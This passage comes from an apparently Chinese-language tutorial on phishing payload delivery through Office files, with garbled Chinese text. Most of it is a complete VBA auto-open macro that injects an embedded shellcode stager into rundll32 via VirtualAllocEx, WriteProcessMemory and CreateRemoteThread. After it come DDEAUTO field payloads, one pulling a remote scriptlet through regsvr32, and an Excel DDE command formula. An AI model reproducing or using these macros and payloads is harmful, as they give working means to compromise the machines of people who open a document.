(<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> LongPtr, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> LongPtr) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDirectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> <span class="built_in">Long</span>, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDriectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    <span class="keyword">Dim</span> pInfo <span class="keyword">As</span> PROCESS_INFORMATION</span><br><span class="line">    <span class="keyword">Dim</span> sInfo <span class="keyword">As</span> STARTUPINFO</span><br><span class="line">    <span class="keyword">Dim</span> sNull <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    <span class="keyword">Dim</span> sProc <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> LongPtr, res <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> <span class="built_in">Long</span>, res <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line">    myArray = Array(<span class="number">-4</span>,<span class="number">-24</span>,<span class="number">-119</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">-119</span>,<span class="number">-27</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">100</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">48</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">12</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">20</span>,<span class="number">-117</span>,<span class="number">114</span>,<span class="number">40</span>,<span class="number">15</span>,<span class="number">-73</span>,<span class="number">74</span>,<span class="number">38</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">-63</span>,<span class="number">-49</span>, _</span><br><span class="line"><span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">-30</span>,<span class="number">-16</span>,<span class="number">82</span>,<span class="number">87</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">16</span>,<span class="number">-117</span>,<span class="number">66</span>,<span class="number">60</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-117</span>,<span class="number">64</span>,<span class="number">120</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">74</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">80</span>,<span class="number">-117</span>,<span class="number">72</span>,<span class="number">24</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-29</span>,<span class="number">60</span>,<span class="number">73</span>,<span class="number">-117</span>,<span class="number">52</span>,<span class="number">-117</span>,<span class="number">1</span>, _</span><br><span class="line"><span class="number">-42</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">-63</span>,<span class="number">-49</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">56</span>,<span class="number">-32</span>,<span class="number">117</span>,<span class="number">-12</span>,<span class="number">3</span>,<span class="number">125</span>,<span class="number">-8</span>,<span class="number">59</span>,<span class="number">125</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">-30</span>,<span class="number">88</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">102</span>,<span class="number">-117</span>,<span class="number">12</span>,<span class="number">75</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-117</span>,<span class="number">4</span>, _</span><br><span class="line"><span class="number">-117</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-119</span>,<span class="number">68</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">91</span>,<span class="number">91</span>,<span class="number">97</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">-1</span>,<span class="number">-32</span>,<span class="number">88</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">-117</span>,<span class="number">18</span>,<span class="number">-21</span>,<span class="number">-122</span>,<span class="number">93</span>,<span class="number">104</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">84</span>,<span class="number">104</span>,<span class="number">76</span>,<span class="number">119</span>,<span class="number">38</span>,<span class="number">7</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">121</span>,<span class="number">-89</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-23</span>,<span class="number">-124</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-55</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">106</span>,<span class="number">3</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">104</span>,<span class="number">-46</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">87</span>,<span class="number">-119</span>,<span class="number">-97</span>, _</span><br><span class="line"><span class="number">-58</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-21</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">82</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="number">-124</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">82</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-21</span>,<span class="number">85</span>,<span class="number">46</span>,<span class="number">59</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-58</span>,<span class="number">-125</span>,<span class="number">-61</span>,<span class="number">80</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">-1</span>,<span class="number">83</span>,<span class="number">86</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">45</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">123</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">15</span>,<span class="number">-124</span>,<span class="number">-61</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-123</span>,<span class="number">-10</span>,<span class="number">116</span>,<span class="number">4</span>,<span class="number">-119</span>,<span class="number">-7</span>,<span class="number">-21</span>,<span class="number">9</span>,<span class="number">104</span>,<span class="number">-86</span>,<span class="number">-59</span>,<span class="number">-30</span>,<span class="number">93</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-63</span>,<span class="number">104</span>,<span class="number">69</span>,<span class="number">33</span>,<span class="number">94</span>,<span class="number">49</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">7</span>,<span class="number">81</span>,<span class="number">86</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-73</span>,<span class="number">87</span>,<span class="number">-32</span>,<span class="number">11</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-65</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">57</span>,<span class="number">-57</span>,<span class="number">116</span>,<span class="number">-73</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-23</span>,<span class="number">-111</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-23</span>,<span class="number">-55</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-24</span>,<span class="number">-117</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-1</span>,<span class="number">-1</span>,<span class="number">47</span>,<span class="number">74</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">71</span>,<span class="number">-37</span>,<span class="number">19</span>,<span class="number">-87</span>,<span class="number">58</span>,<span class="number">-110</span>,<span class="number">11</span>,<span class="number">66</span>,<span class="number">63</span>,<span class="number">40</span>,<span class="number">-36</span>,<span class="number">-114</span>,<span class="number">-75</span>,<span class="number">-101</span>,<span class="number">62</span>,<span class="number">108</span>,<span class="number">29</span>,<span class="number">-115</span>,<span class="number">-75</span>,<span class="number">-106</span>,<span class="number">35</span>,<span class="number">-3</span>,<span class="number">71</span>,<span class="number">126</span>,<span class="number">24</span>,<span class="number">-107</span>,<span class="number">101</span>,<span class="number">80</span>,<span class="number">116</span>,<span class="number">13</span>,<span class="number">70</span>,<span class="number">52</span>, _</span><br><span class="line"><span class="number">101</span>,<span class="number">6</span>,<span class="number">59</span>,<span class="number">-12</span>,<span class="number">-45</span>,<span class="number">32</span>,<span class="number">103</span>,<span class="number">-104</span>,<span class="number">10</span>,<span class="number">62</span>,<span class="number">77</span>,<span class="number">18</span>,<span class="number">-84</span>,<span class="number">12</span>,<span class="number">58</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">56</span>,<span class="number">-75</span>,<span class="number">32</span>,<span class="number">-39</span>,<span class="number">8</span>,<span class="number">-80</span>,<span class="number">107</span>,<span class="number">-43</span>,<span class="number">108</span>,<span class="number">71</span>,<span class="number">63</span>,<span class="number">20</span>,<span class="number">41</span>,<span class="number">-82</span>,<span class="number">-42</span>,<span class="number">23</span>,<span class="number">58</span>,<span class="number">-126</span>,<span class="number">98</span>,<span class="number">-100</span>,<span class="number">-108</span>,<span class="number">-126</span>,<span class="number">76</span>, _</span><br><span class="line"><span class="number">-44</span>,<span class="number">0</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">45</span>,<span class="number">65</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">58</span>,<span class="number">32</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">77</span>, _</span><br><span class="line"><span class="number">83</span>,<span class="number">73</span>,<span class="number">69</span>,<span class="number">32</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">32</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">66</span>,<span class="number">79</span>, _</span><br><span class="line"><span class="number">73</span>,<span class="number">69</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">69</span>,<span class="number">78</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">41</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">53</span>,<span class="number">-24</span>,<span class="number">107</span>,<span class="number">-26</span>,<span class="number">-93</span>,<span class="number">106</span>,<span class="number">-40</span>,<span class="number">-71</span>,<span class="number">-105</span>,<span class="number">-127</span>,<span class="number">-22</span>,<span class="number">100</span>,<span class="number">-16</span>,<span class="number">117</span>,<span class="number">-9</span>,<span class="number">83</span>,<span class="number">112</span>,<span class="number">-101</span>,<span class="number">60</span>,<span class="number">-4</span>,<span class="number">105</span>,<span class="number">72</span>,<span class="number">-127</span>,<span class="number">96</span>,<span class="number">-60</span>, _</span><br><span class="line"><span class="number">-29</span>,<span class="number">27</span>,<span class="number">-62</span>,<span class="number">-29</span>,<span class="number">98</span>,<span class="number">-95</span>,<span class="number">-56</span>,<span class="number">-46</span>,<span class="number">-6</span>,<span class="number">-57</span>,<span class="number">-39</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">-70</span>,<span class="number">101</span>,<span class="number">-16</span>,<span class="number">86</span>,<span class="number">-85</span>,<span class="number">-15</span>,<span class="number">25</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">-46</span>,<span class="number">-118</span>,<span class="number">-62</span>,<span class="number">1</span>,<span class="number">-19</span>,<span class="number">85</span>,<span class="number">56</span>,<span class="number">18</span>,<span class="number">-105</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">102</span>,<span class="number">116</span>,<span class="number">-54</span>,<span class="number">50</span>,<span class="number">-67</span>,<span class="number">81</span>,<span class="number">-20</span>, _</span><br><span class="line"><span class="number">40</span>,<span class="number">-19</span>,<span class="number">-52</span>,<span class="number">101</span>,<span class="number">6</span>,<span class="number">116</span>,<span class="number">118</span>,<span class="number">-128</span>,<span class="number">-118</span>,<span class="number">-9</span>,<span class="number">-46</span>,<span class="number">-96</span>,<span class="number">-122</span>,<span class="number">116</span>,<span class="number">-70</span>,<span class="number">107</span>,<span class="number">-54</span>,<span class="number">-78</span>,<span class="number">59</span>,<span class="number">119</span>,<span class="number">-51</span>,<span class="number">-52</span>,<span class="number">5</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">-9</span>,<span class="number">-60</span>,<span class="number">102</span>,<span class="number">-96</span>,<span class="number">109</span>,<span class="number">-90</span>,<span class="number">-122</span>,<span class="number">-92</span>,<span class="number">-81</span>,<span class="number">34</span>,<span class="number">-70</span>,<span class="number">-106</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">121</span>, _</span><br><span class="line"><span class="number">-6</span>,<span class="number">-5</span>,<span class="number">-12</span>,<span class="number">107</span>,<span class="number">-44</span>,<span class="number">73</span>,<span class="number">-31</span>,<span class="number">52</span>,<span class="number">87</span>,<span class="number">-89</span>,<span class="number">13</span>,<span class="number">77</span>,<span class="number">-121</span>,<span class="number">-68</span>,<span class="number">-37</span>,<span class="number">74</span>,<span class="number">-23</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">-122</span>,<span class="number">79</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">-39</span>,<span class="number">58</span>,<span class="number">121</span>,<span class="number">-100</span>,<span class="number">20</span>,<span class="number">53</span>,<span class="number">28</span>,<span class="number">27</span>,<span class="number">-15</span>,<span class="number">29</span>,<span class="number">52</span>,<span class="number">-107</span>,<span class="number">127</span>,<span class="number">-89</span>,<span class="number">40</span>,<span class="number">-4</span>,<span class="number">-122</span>, _</span><br><span class="line"><span class="number">-73</span>,<span class="number">-101</span>,<span class="number">75</span>,<span class="number">-64</span>,<span class="number">-59</span>,<span class="number">111</span>,<span class="number">105</span>,<span class="number">16</span>,<span class="number">79</span>,<span class="number">-121</span>,<span class="number">7</span>,<span class="number">33</span>,<span class="number">-121</span>,<span class="number">58</span>,<span class="number">125</span>,<span class="number">79</span>,<span class="number">59</span>,<span class="number">31</span>,<span class="number">-97</span>,<span class="number">-45</span>,<span class="number">25</span>,<span class="number">105</span>,<span class="number">90</span>,<span class="number">-99</span>,<span class="number">6</span>,<span class="number">38</span>,<span class="number">74</span>,<span class="number">-22</span>,<span class="number">86</span>,<span class="number">17</span>,<span class="number">-99</span>,<span class="number">-58</span>,<span class="number">-36</span>,<span class="number">55</span>,<span class="number">5</span>,<span class="number">-96</span>,<span class="number">-109</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">-66</span>, _</span><br><span class="line"><span class="number">-23</span>,<span class="number">-116</span>,<span class="number">-38</span>,<span class="number">-13</span>,<span class="number">-33</span>,<span class="number">89</span>,<span class="number">30</span>,<span class="number">32</span>,<span class="number">90</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">-33</span>,<span class="number">-48</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">-76</span>,<span class="number">-11</span>,<span class="number">44</span>,<span class="number">50</span>,<span class="number">-68</span>,<span class="number">-127</span>,<span class="number">-70</span>,<span class="number">-43</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">-16</span>,<span class="number">-75</span>,<span class="number">-94</span>,<span class="number">86</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">106</span>,<span class="number">64</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">88</span>,<span class="number">-92</span>,<span class="number">83</span>,<span class="number">-27</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-109</span>,<span class="number">-71</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-39</span>,<span class="number">81</span>,<span class="number">83</span>,<span class="number">-119</span>,<span class="number">-25</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">86</span>,<span class="number">104</span>,<span class="number">18</span>,<span class="number">-106</span>,<span class="number">-119</span>,<span class="number">-30</span>,<span class="number">-1</span>,<span class="number">-43</span>, _</span><br><span class="line"><span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">-58</span>,<span class="number">-117</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">-61</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">117</span>,<span class="number">-27</span>,<span class="number">88</span>,<span class="number">-61</span>,<span class="number">-24</span>,<span class="number">-87</span>,<span class="number">-3</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">0</span>,<span class="number">111</span>,<span class="number">-86</span>,<span class="number">81</span>,<span class="number">-61</span>)</span><br><span class="line">    <span class="keyword">If</span> Len(Environ(<span class="string">"ProgramW6432"</span>)) &gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\SysWOW64\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\System32\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">1</span>&amp;, <span class="keyword">ByVal</span> <span class="number">4</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, <span class="number">0</span>, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    <span class="keyword">For</span> offset = LBound(myArray) <span class="keyword">To</span> UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, <span class="number">1</span>, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;)</span><br><span class="line">    <span class="keyword">Next</span> offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, <span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æï¼š sProcä¸ºrundll32.exeçš„è·¯å¾„<br>ç„¶åRunStff -&gt; CreateProcessA<br>ä½¿ç”¨rundll32åˆ›å»ºè¿›ç¨‹ï¼Œç„¶åä½¿ç”¨WriteStuffæ³¨å…¥shellcode(myArray)</p><p><strong>PS: åŒæ—¶ä¹Ÿå¯ç”¨Msf æˆ–è€… Empireç­‰å·¥å…·ç”ŸæˆMacroåé—¨</strong></p><h3 id="Office-DDE"><a href="#Office-DDE" class="headerlink" title="Office DDE"></a>Office DDE</h3><p>Ctrl + F9 ï¼ˆCommand + F9ï¼‰å¯å¼€å¯åŸŸ<br>å¡«å…¥ä»£ç å³å¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; \* MERGEFORMAT</span><br></pre></td></tr></table></figure></p><p><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/F8346748-1553-4C23-BD4E-063A4EA1150C.png" alt="15e498b5fb55042af504a1f99a898b91"></p><p>è”åŠ¨MSF (web_delivery)ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k regsvr32 /s /n /u /i:http://192.168.0.1/A9IcXi.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure></p><p>è¿™ç§æ–¹å¼å›éœ€è¦å—å®³è€…ç¡®è®¤æ‰“å¼€è¿›ç¨‹ï¼Œæœ‰ä¸€å®šé£é™©</p><h3 id="Excel-IQY"><a href="#Excel-IQY" class="headerlink" title="Excel IQY"></a>Excel IQY</h3><p>IQYæ˜¯ä¸€ä¸ªExcel WebæŸ¥è¯¢ç”¨åˆ°çš„ä¸œè¥¿ï¼Œå¯ä»¥ç›´æ¥å§äº’è”ç½‘ä¸Šçš„ä¸œè¥¿æ‰“å°åˆ°è¡¨ä¸­<br>æ•°æ®-&gt;å€’å…¥æ•°æ®-&gt;æ–°å»ºWebæŸ¥è¯¢<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/CBC34D2AE7ADB278D040CA16FF6E1DF9.jpg" alt="cbc34d2ae7adb278d040ca16ff6e1df9"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/c calc.exe &apos;!A0</span><br></pre></td></tr></table></figure><p>å•å¼•å·å†…è°ƒç”¨æ¶æ„ç¨‹åº<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/6CA2FC83266D62BB018FA05C8DA71CE1.png" alt="6ca2fc83266d62bb018fa05c8da71ce1"></p><p>åŒæ ·éœ€è¦å—å®³è€…ç¡®è®¤æ‰“å¼€è¿›ç¨‹</p><h3 id="OLE"><a href="#OLE" class="headerlink" title="OLE"></a>OLE</h3><p>OLE - å¤–éƒ¨å¯¹è±¡<br>å¸¸è§åˆ©ç”¨åœºæ™¯è§CVE-2017-0199</p><h3 id="UNCè·¯å¾„"><a href="#UNCè·¯å¾„" 